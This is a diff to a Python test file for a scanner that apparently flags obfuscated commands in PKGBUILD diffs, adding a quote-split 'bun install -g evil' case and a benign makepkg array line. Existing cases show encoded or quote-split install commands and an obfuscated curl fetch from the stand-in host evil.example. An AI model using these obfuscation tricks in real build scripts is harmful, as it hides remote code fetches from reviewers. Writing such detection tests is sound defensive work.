@@ -512,6 +512,9 @@ def test_scan_diff_reports_reduced_coverage_without_tree():
     (r"$'\142\165\156' install -g evil", "bun"),
     ("b''u''n install -g evil", "bun"),
     (r"$(printf '\x63\x75\x72\x6c') https://evil.example/x", "curl"),
+    # Partial quoting is the other reconstruction target: the quotes split a
+    # word (``b"u"n`` -> ``bun``) rather than decorating data.
+    ('b"u"n install -g evil', "bun"),
 ])
 def test_h065_reports_what_the_line_was_read_as(obfuscated, revealed):
     diff = f"""--- a/PKGBUILD
@@ -562,6 +565,10 @@ def test_h065_reports_an_unreconstructable_literal_as_inconclusive():
     r"printf '%s\n' \"$pkgver\"",
     "grep '/Windows/Fonts/.*[cf]$' list",
     "install -Dm755 app \"$pkgdir/usr/bin/app\"",
+    # The `::` that separates a makepkg array element's two halves is
+    # punctuation, not a hidden word; mautrix-signal-bin's arch-parameterised
+    # `source_x86_64` read as `"x86_64"::"${url}"` and fired H065.
+    'source_x86_64=("${pkgname}-x86_64"::"${url}/releases/download/x")',
 ])
 def test_h065_quiet_on_ordinary_shell(line):
     diff = f"""--- a/PKGBUILD
